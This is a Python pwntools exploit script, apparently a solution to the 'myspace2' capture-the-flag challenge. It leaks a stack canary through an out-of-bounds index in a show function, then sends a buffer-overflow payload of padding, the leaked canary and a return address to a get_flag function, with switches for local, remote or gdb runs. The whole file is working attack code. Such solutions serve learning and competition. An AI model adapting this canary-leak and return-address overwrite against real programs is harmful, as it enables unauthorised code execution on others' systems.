from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./myspace2"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("myspace2.chal.idek.team", 1337)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

def edit(idx, content):
    io.sendlineafter(">> \n", "2")
    io.sendlineafter("edit (0-7):", str(idx))
    io.sendlineafter("name: ", content)

def show(idx):
    io.sendlineafter(">> \n", "3")
    io.sendlineafter(": \n", str(idx))

def all():
    io.sendlineafter(">> \n", "1")

def exit():
    io.sendlineafter(">> \n", "4")
get_flag = 0x4012A1

show(13)
io.recvuntil("index!\n", drop=True)

canary = u64(io.recv(8))
log.success("canary :-----> " + hex(canary))

payload = b"a"*0x30 
payload += p64(canary)
payload += p64(0)
payload += p64(get_flag)

ddebug("b *0x40146A\n continue")
edit(7, payload)
exit()
io.interactive()
